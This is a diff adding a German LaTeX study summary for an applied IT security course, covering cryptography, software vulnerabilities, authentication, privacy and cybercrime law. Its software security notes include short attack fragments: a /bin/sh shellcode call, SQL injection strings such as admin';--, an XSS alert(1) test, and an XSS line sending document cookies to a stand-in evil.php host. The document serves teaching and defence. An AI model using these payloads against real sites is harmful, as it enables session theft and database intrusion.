@@ -1,0 +1,610 @@
+\documentclass[11pt, paper=a4, twocolumn]{scrartcl}
+
+\usepackage[ngerman]{babel}
+\usepackage[utf8]{inputenc}
+
+\usepackage[T1]{fontenc}
+
+\usepackage{geometry}
+
+\geometry{a4paper, top=20mm, left=15mm, right=15mm, bottom=20mm,
+headsep=5mm, footskip=12mm}
+
+
+\pagenumbering{gobble}
+
+\title{\vspace{-1.25cm}Zusammenfassung AppITSec\vspace{-0.25cm}}
+\date{\vspace{-5ex}}
+
+
+
+\begin{document}
+	\maketitle
+
+
+\section{Einführung und Grundlagen}
+\begin{itemize}
+	\item Was ist Sicherheit?
+		\begin{itemize}
+			\item Schutzmaßnahmen basieren auf Annahmen
+			\item Präventiv / eindämmen / kompensieren
+			\item Mehrseitige Sicherheitsinteressen 
+				verschiedener Parteien
+			\item Aufbau von Vertrauensbeziehungen nötig
+		\end{itemize}
+
+	\item Schutzziele und Angreifer
+		\begin{itemize}
+			\item Interessen und Ziele
+				\begin{itemize}
+					\item CIA: Vertraulichkeit (confidentiality), 
+						Integrität (integrity), Verfügbarkeit 
+						(availabity)
+					\item Verfügbarkeit (Wahrscheinlichkeit zu 
+						Zeitpunkt) vs. Zuverlässigkeit 
+						(Missionszeit)
+					\item Integrität: semantisch (erfüllt Erwartung) 
+						vs. Zustand (Modifizierung)
+					\item Vertraulichkeit (Nachricht nur an Empfänger)
+					\item Authentizität (kommt X von A?)
+					\item Nicht-Abstreitbarkeit (Nachweis einer 
+						Dienstleistung)
+					\item Unbeobachtbarkeit (Wurde Ressource benutzt?)
+					\item Anonymität (Wer wars?)
+				\end{itemize}
+			\item Gefahren
+				\begin{itemize}
+					\item Zufällige vs. böswillige Gefahren 
+					\item Vertrauen macht Annahmen über Gefahren
+					\item Transitive Ausbreitung von Fehlern
+					\item Angreifermodell: Rolle, Verbreitung, 
+						Verhalten
+					\item Attack Trees: Wurzel (Angriffsziel) und 
+						Ebenen (Teilaufgaben)
+				\end{itemize}
+
+			\item Schutzmechanismen
+				\begin{itemize}
+					\item Laptop Locks, Künstliche DNA
+					\item Lokalisierungssoftware
+					\item Schutz vor Dumpster Diving
+					\item Anti-Tailgating
+				\end{itemize}
+		\end{itemize}
+
+	\item Sicherheit im Cyberspace
+		\begin{itemize}
+			\item Naturgesetze des Cyberspace
+				\begin{itemize}
+					\item 1. Gesetz: Automatisierbarkeit (Nachbildung, 
+						aber nur programmierte Regeln)
+
+					\item 2. Gesetz: Räumliche Entgrenzung 
+						(Entkopplung von geographie und Hardware)
+					\item 3. Gesetz: Kopierbarkeit (Auch Identitäten)
+					\item 4. Gesetz: Komplexität 
+				\end{itemize}
+			
+			\item Auswirkungen auf Schutzziele und Angreifer
+				\begin{itemize}
+					\item Google Hacking
+					\item Brute Force Angriffe
+					\item Daten (physisch) vs. Informationen 
+						(Interpretation)
+					\item Informationsfluss: Sender, Empfänger, 
+						Nachricht, Beobachter
+					\item Inferenz von Wissen (Beispiel 
+						Gleichungssystem)
+					\item Denial of Service (automatisch vs. 
+						menschlich)
+					\item Malware, Spam, Spoofing
+				\end{itemize}
+
+		\end{itemize}
+
+
+\end{itemize}
+
+\section{Kryptographie}
+	\begin{itemize}
+		\item Symmetrische und asymmetrische Verfahren
+			\begin{itemize}
+				\item Sichert Vertraulichkeit und Integrität
+				\item Angriffsbereich umfasst nur Schlüsseltext
+				\item Schlüsselgenerierung, Ver- und Entschlüsselung
+				\item Vernam-Chiffre (one-time-pad)
+				\item Verteilung eines symm. Schlüssels über 
+					Schlüsselverteilzentralen ($k_{AX},k_{BX}$)
+				\item Asymmetrische Schlüsselverteilung
+					\begin{itemize}
+						\item A lässt pub. Key in 
+							Schlüsselregister eintragen
+						\item B stellt Anfrage an R
+						\item B erhält pub. Key von A, signiert 
+							von R
+					\end{itemize}
+				\item Symmetrische Authentifikation: Nachricht + k(m) als 
+					MAC
+				\item Asymmetrisch: Signierschlüssel + Testschlüssel
+				\item Verteilung über Schlüsselregister
+				\item Generierung von Zufallszahlen durch xor
+				\item Symmetrischer Schlüsselaustausch bei $n$ 
+					Teilnehmern: $n*(n-1)/2$
+			\end{itemize}
+
+		\item Sicherheit von Krypto
+			\begin{itemize}
+				\item Total, universal, selective, existential break
+				\item ciphertext-only, known-plaintext, chosen-plaintext, 
+					chosen-ciphertext
+				\item Informationstheoretisch sicher vs. kryptographisch 
+					stark
+				\item Hybride Kryptosysteme (asymmetrischer 
+					Schlüsseltausch)
+				\item Informationstheoretisch sicher wenn hinter jedem 
+					Schlüsseltext jeder Klartext gleichwahrscheinlich 
+					ist
+				\item Perfekte Sicherheit: keine Rückschlüsse von cipher 
+					auf plain
+			\end{itemize}
+
+		\item Diffie-Hellman-Schlüsselaustausch
+			\begin{itemize}
+				\item Schlüsselaustausch: physikalisch vs. organisatorisch
+				\item Grundlage: diskrete Exponentiation:\\ 
+					$\alpha = g^a\;mod\;p$
+				\item Primzahl $p$ und nat. Zahl $g$ öffentlich
+				\item Teilnehmer wählen geheimes $a$ bzw. $b$
+				\item Bilde $\alpha,\beta$ wie oben und tausche aus
+				\item Berechnung von $\beta^a\;mod\;p$
+			\end{itemize}
+		
+		\item RSA
+			\begin{itemize}
+				\item Mathematischer Hintergrund
+					\begin{itemize}
+						\item Modulare Exponentiation als 
+							Grundlage 
+						\item Eulersche Phi-Funktionen
+						\item $a^{\phi(N)}\equiv 1\;mod\;N$
+						\item $a^p \equiv a\;mod\;p$
+					\end{itemize}
+
+				\item Algorithmus
+					\begin{enumerate}
+						\item Wähle große Primzahlen $p$ und $q$
+						\item Berechne $N=p*q$ und 
+							$\phi(N)=(p-1)(q-1)$
+						\item Wähle $3\leq c<\phi(N)$
+						\item Berechne $d$ als multiplikatives 
+							Inverses zu $c$
+						\item public: $(c,N)$, private: $(d,N)$
+					\end{enumerate}
+
+			\end{itemize}
+
+		\item Digitale Bezahlung
+			\begin{itemize}
+				\item Angriff von Davida
+					\begin{itemize}
+						\item Angreifer fängt verschlüsselte 
+							Nachricht ab
+						\item Angreifer wählt $y$, berechnet $y^c$ 
+							und schickt $x^c*y^c$ an Bob
+						\item Homomorphismus: $(x*y)^{c}$
+						\item Angreifer erhält entschlüsseltes 
+							$x*y$ und kann $y$ rausteilen
+					\end{itemize}
+				\item Blinde Signaturen
+					\begin{itemize}
+						\item Lasse $(m*r^{test})$ signieren
+						\item Signatur mit $s$ liefert 
+							$(m*r^t)^s=m^s*r$
+						\item Division durch $r$ liefert 
+							signiertes $m^s$
+					\end{itemize}
+				\item Erzeugung von digitalem Geld
+					\begin{itemize}
+						\item Bank hat Signierschlüssel und 
+							Testschlüssel für 5 Euro
+						\item Alice generiert Zufalszahlen $r$ und 
+							$v$, $w=vv$
+						\item Alice schickt $r^{t_5}*w$ an Bank
+						\item Bank signiert dies und antwortet 
+							mit $r*w^{s_5}$
+						\item Alice teilt $r$ wieder raus und hat 
+							signierten Geldschein
+					\end{itemize}
+			\end{itemize}
+	\end{itemize}
+
+
+\section{Software Security}
+	\begin{itemize}
+		\item Motivation
+			\begin{itemize}
+				\item Sicherheitslücken / vulnerabilities
+				\item \texttt{-1 \% 2i == -1}
+				\item Angriffsziel: eigenen Code ausführen
+				\item Privilegeskalation
+			\end{itemize}
+
+		\item Integer Overflows
+			\begin{itemize}
+				\item Datentypen
+					\begin{itemize}
+						\item (un)signed \texttt{char}: 8 Bit, 
+							0-255/-128-127
+						\item \texttt{short}: min. 16 Bit
+						\item \texttt{long}: min. 32 Bit
+						\item \texttt{int}: mindestens ein 
+							\texttt{short}, meist aber 
+							\texttt{long}
+					\end{itemize}
+				\item Regeln des Typecast
+					\begin{itemize}
+						\item Downcast: Abschneiden der höchsten 
+							Bytes 
+						\item Upcast: Bei \texttt{signed} 
+							Vorzeichen mitziehen
+						\item Bei Vergleichen wird auf größeren 
+							Typ erweitert
+						\item \texttt{signed} $\leftrightarrow$ 
+							\texttt{unsigned}: Vorzeichen 
+							uminterpretieren
+						\item Erst Größe, dann Vorzeichen
+					\end{itemize}
+				\item Modulus mit unsigned / signed
+				\item Vergleich mit unsigned führt bei Überlauf zu 
+					negativen Werten
+				\item Längenvergleich mit Addition ist kritisch
+			\end{itemize}
+
+		\item Heap Overflows
+			\begin{itemize}
+				\item Alligned an (32 Bit?) Grenzen
+				\item Wächst von unten nach oben
+				\item Überschreiben von Funktionspointern
+			\end{itemize}
+
+		\item Shellcode
+			\begin{itemize}
+				\item \texttt{execve(''/bin/sh", argv, NULL)}
+				\item String, Adresse davon + Null, Adresse davon
+				\item \texttt{ebp}: rbp, rip (+4), par1 (+8)
+			\end{itemize}
+
+		\item Stack Overflows
+			\begin{itemize}
+				\item Text, Data (Var, BSS, Heap), Stack
+				\item \texttt{strcpy, sprintf(buf,"\%s",str), scanf, 
+					gets, strcat}
+				\item Schutzmaßnahmen
+					\begin{itemize}
+						\item Kernel: MMU Access Control Lists 
+							(NX), ASLR (Stack, Heap, Libs)
+						\item Compiler: Split-Stack, Canaries
+					\end{itemize}
+				\item SUID root
+				\item \texttt{x86}: Parameter umgekehrt pushen
+				\item Häufig 16B Offset zwischen locals und RIP
+			\end{itemize}
+
+		\item Return-oriented Programming
+			\begin{itemize}
+				\item Gadgets for return
+				\item Gadgets nacheinander auf Stack stapeln
+				\item mit \texttt{pop esp} Gadget gotos nachbauen
+				\item Address Translation Cache Preloading Attack
+			\end{itemize}
+
+		\item Formatstring-Angriffe
+			\begin{itemize}
+				\item \texttt{\%d, \%x, \%n}: (hexa)dez., Anzahl an Bytes
+				\item Nimmt an, dass Argumente auf Stack liegen
+				\item Analysieren mit \texttt{\%x}, schreiben mit 
+					\texttt{\%n}
+				\item Einbauen von Formatsymbolen durch Angreifer
+				\item Internationalisierung durch Textdateien
+			\end{itemize}
+
+		\item Fehlerinjektion und Type Confusion
+			\begin{itemize}
+				\item Type Confusion: Zwei Variablen unterschiedlichen 
+					Typs zeigen auf gleiche Adresse
+				\item Ausgelöst durch Bitfehler
+				\item Klassen mit Objektref. / Int
+				\item Vorgehen
+					\begin{itemize}
+						\item Viele Objekte von Typ B erzeugen
+						\item Alle A-Felder darin zeigen auf 
+							gleiches A-Objekt an Adresse x
+						\item Bitfehler lässt 1 Bit kippen sodass 
+							eine Ref. nun auf y zeigt
+						\item y vom Typ B?
+						\item Schreiben: \texttt{p.i=addr-off}\\
+							\texttt{q.a6.i=val}
+					\end{itemize}
+				\item Row Hammer für DRAM
+			\end{itemize}
+
+		\item Injection-Angriffe
+			\begin{itemize}
+				\item SQL-Injection
+					\begin{itemize}
+						\item Steuerzeichen: \texttt{; -- ' "}
+						\item \texttt{INFORMATION\_SCHEMA}, 
+							LIMIT-Klausel
+						\item Problem der Rechtevergabe
+						\item Beispielinjektion: 
+							\texttt{admin';--}
+						\item \texttt{UNION} zur Erweiterung von 
+							Anfragen
+						\item Bei fehlender Ausgabe:\\ 
+							\texttt{SELECT IF(..., 
+							benchmark(...),'false'),...-- }
+						\item Schachtelung gegen regex
+						\item SQL-Funktion \texttt{CONCAT}
+						\item Lösungsansätze: Prepared statements, 
+							real escape String
+					\end{itemize}
+
+				\item XSS
+					\begin{itemize}
+						\item Same Origin Policy: Protokoll, 
+							Domain und Port
+						\item Reflected: über URL
+						\item Persistent: auf Server gespeichert
+						\item DOM: URL erzeugt Skript mit 
+							manipulierten DOM-Zugriffen
+						\item Klassiker:\\ 
+							\texttt{<skript>alert(1)</skript>}
+						\item iframe mit Phishing Seite
+						\item doc.write Bild mit\\
+							src=evil.php?cookie=doc.cookie
+						\item Gegenmaßnahmen: 
+							\texttt{htmlentities()},  
+							Whitelisting, 
+							Content-Security-Policy usw.
+					\end{itemize}
+
+				\item Malicious file execution
+					\begin{itemize}
+						\item Meist Remote-/Webshells
+						\item Ungeschickte Upload-Funktion
+						\item Manipulieren von include-Anweisungen
+						\item \texttt{system} Aufrufe mit ; 
+							erweitern
+					\end{itemize}
+				\item Directory Traversal
+			\end{itemize}
+
+		\item Race Conditions
+			\begin{itemize}
+				\item TOCTOU Problem
+				\item Nach Check eigentliche Datei durch Symlink ersetzen
+				\item Kritischen Code mit \texttt{nice -n 19} ausführen
+				\item Bei erzeugen von tmp Files diese umbiegen
+				\item Verschachtelung von Signals
+				\item Abhilfe: Korrekte synchro, reentrant Code, zufällige 
+					Dateinamen
+			\end{itemize}
+
+	\end{itemize}
+
+\section{Authentifikation, Authentisierung, Autorisierung}
+	\begin{itemize}
+		\item Begriffe: Wer authentisiert womit?
+			\begin{itemize}
+				\item Ziele: Zugriffskontrolle und Zurechenbarkeit
+				\item Zugriffsmonitor prüft Berechtigungen
+				\item Authentifikation überprüft Person = Identität
+				\item Benutzerkennung ordnet Aktionen einem Benutzer zu
+				\item Verifier authentifiziert Prover, der sich beim V 
+					authentisiert
+				\item Ablauf: Identifizierung, Authentifikation, 
+					Autorisierung
+				\item Faktoren: biometrisch, physisch, Wissen
+				\item Zwischen Systemen: Krypto, Leitung usw.
+				\item Qualität vs. Benutzbarkeit
+			\end{itemize}
+
+		\item Referenzmonitor und Zugriffskontrolle
+			\begin{itemize}
+				\item Referenzmonitor muss manipulationssicher, 
+					unumgänglich und klein genug sein
+				\item Beispiel: Betriebssystemmodi 
+				\item Physischer Zugriff kann Monitor umgehen 
+					(z.B. Cold Boot)
+				\item Vertrauenswürdige Hardware notwendig
+				\item Smartcards enthalten Mikroprozessor und 
+					Kryptoschlüssel
+				\item Trusted Platform Module (Schlüsselspeicher + 
+					Randomgen.)
+				\item Überprüft Stufe $n$ und gibt dann Schlüssel für 
+					nächste Stufe frei
+				\item Anwendung: Remote Attestation für Datei testen (DRM)
+				\item Für vollständigen Schutz Wasserzeichen
+			\end{itemize}
+
+		\item Gegenseitige Authentifikation
+			\begin{itemize}
+				\item Vertrauenswürdiger Verifier?
+				\item Bootkit: Angreifer manipuliert Bootloader sodass 
+					dieser Passwort logged
+				\item Bios-Rootkit kann Keyloggen
+				\item Tamper (Bootkit speicher PW, dann reboot) and 
+					Revert (richtiges BIOS reinstallieren)
+				\item Copy, Sniff (Tamper) and Revert
+				\item Lösung: Bei jedem Login neue monce
+			\end{itemize}
+
+		\item Trusting Trust (Trojanisierter Compiler)
+	\end{itemize}
+
+\section{Privacy}
+	\begin{itemize}
+		\item Identität und Privatsphäre
+			\begin{itemize}
+				\item Privacy
+					\begin{itemize}
+						\item Secrecy (limited access)
+						\item Confidentiality (bzgl. Organisation)
+						\item Privacy (bzgl. Individual)
+						\item Personenbezogen vs. räumlich vs. 
+							informationell
+					\end{itemize}
+
+				\item Identität
+					\begin{itemize}
+						\item Authentifizierungsmerkmale
+						\item Natürliche vs. juristische Personen
+						\item Teilidentitäten (Verkettung)
+						\item Persistente Elemente wichtiger als 
+							flüchtige
+					\end{itemize}
+
+				\item Bedrohungen
+					\begin{itemize}
+						\item Fehlentscheidung durch 
+							Falschinformation
+						\item Datenmissbrauch
+						\item Zweitverwertung
+						\item Verknüpfbarkeit
+						\item Langfristige Aufbewahrung
+						\item Öffentliche Zugänglichmachung
+					\end{itemize}
+
+				\item Identitätsdiebstahl
+					\begin{itemize}
+						\item New Account Fraud (künstliche ID)
+						\item Account Takeover (bestehende ID)
+					\end{itemize}
+			\end{itemize}
+
+		\item Anonymität
+			\begin{itemize}
+				\item DC-Netze
+					\begin{itemize}
+						\item Broadcastnetz
+						\item Onetime-pad Schlüssel zwischen allen 
+							Teilnehmern (pro Runde)
+						\item Pro Runde: Nachricht mit allen 
+							Schlüsseln die man hat xorn
+						\item Wenn keine, dann leere Nachricht
+						\item Summe aller Nachrichten ergibt 
+							Original
+						\item Perfekt anonym aber 
+							Kollisionserkennung nötig
+					\end{itemize}
+
+				\item MIX-Verfahren
+					\begin{itemize}
+						\item Nachrichten sammeln und gemeinsam 
+							ausgeben
+						\item Alle Nachrichten am besten gleiche 
+							Länge
+						\item Verwendet asymmetrische Krypto
+						\item Prinzip: 
+							$A_1,c_1(A_2,c_2(M,r_2),r_1)$
+					\end{itemize}
+
+			\end{itemize}
+
+		\item Informationsflusskontrolle und Seitenkanäle
+			\begin{itemize}
+				\item Inferenz(kontrolle)
+				\item Funktionsumkehrung: \\
+					Beobachter berechnet $\{z | f(z) = y\}$
+				\item Abwehrmaßnahmen
+					\begin{itemize}
+						\item Dynamisches Monitoring ausgehender 
+							Nachrichten
+						\item Statische Verifikation beim Entwurf
+					\end{itemize}
+				\item Direkter, indirekter, transitiver, impliziter 
+					Informationsfluss
+				\item partial, implicit, difficult
+				\item Über Arrays, Parallelität, Laufzeit
+				\item Browser Fingerprinting
+				\item Covert Channels
+				\item Lösung: Aktionen ununterscheidbar machen
+			\end{itemize}
+	\end{itemize}
+
+\section{Cybercrime}
+	\begin{itemize}
+		\item Malware
+			\begin{itemize}
+				\item unerwünschte / schädliche Funktionalität
+				\item Schadroutine vs. Verbreitungsroutine
+				\item Verbreitung: autonom (Wurm) vs. Interaktion (Virus, 
+					Trojaner)
+				\item Schaden: Spyware, Bot, Backdoor
+				\item Klassiker: Melissa Spam
+				\item Wurm: Verbreitung? Verteidigung?
+				\item Malware (generisch, weite Verbreitung) vs. Milware 
+					(spezifisch, 0-Day-Exploits)
+			\end{itemize}
+
+		\item Bots und Botnetze
+			\begin{itemize}
+				\item Bots ähnlich zu Würmern
+				\item Machen Rechner fernsteuerbar
+				\item Empfangen von Kommandos über IRC
+				\item Patchbar über \texttt{http.update}
+				\item Tracking durch Netzwerkanalyse, Infiltration
+			\end{itemize}
+
+		\item Underground Economy
+			\begin{itemize}
+				\item Gegen vs. Mit Technik begangene Straftaten
+				\item Angebot >> Nachfrage
+				\item Angebot
+					\begin{itemize}
+						\item Ernten durch Phishing, Skimming
+						\item Dienstleistungen wie Hack, Host, 
+							Spam
+					\end{itemize}
+				\item Nachfrage
+					\begin{itemize}
+						\item Daten zu Geld machen
+						\item Money Mules zur Geldwäsche
+						\item Reshipper, CEO-Fraud
+					\end{itemize}
+				\item Spam für Werbung, Phishing, Malware
+				\item Template-based Spamming über Bots
+				\item Fast Flux: Bots als Web-Proxies
+				\item Click Fraud
+				\item DDoS via Botnetze
+				\item Pay per Install Dienste
+				\item Fake A/V, Ransomware
+				\item Stock Spam (Pump and Dump)
+			\end{itemize}
+
+		\item Recht und Ethik
+			\begin{itemize}
+				\item Tatwerkzeug vs. Angriffsziel
+				\item Vertraulichkeit (§202)
+					\begin{itemize}
+						\item Ausspähen von Daten (§202a)
+						\item Abfangen von Daten (§202b)
+						\item Vorbereiten des Ausspähens / 
+							Abfangens (§202c)
+					\end{itemize}
+				\item Integrität (§303)
+					\begin{itemize}
+						\item Datenveränderung (§303a)
+						\item Computersabotage (§303b)
+					\end{itemize}
+				\item Verfügbarkeit (§303)\\
+					Computersabotage (§303b)
+				\item Computerbetrug §263a
+				\item Ethische Richtlinien
+				\item Wer profitiert? Nutzen vs. mögliche Schäden, 
+					verringern von Schadensrisiko, wenig 
+					Missbrauchpotential
+			\end{itemize}
+	\end{itemize}
+
+\end{document}
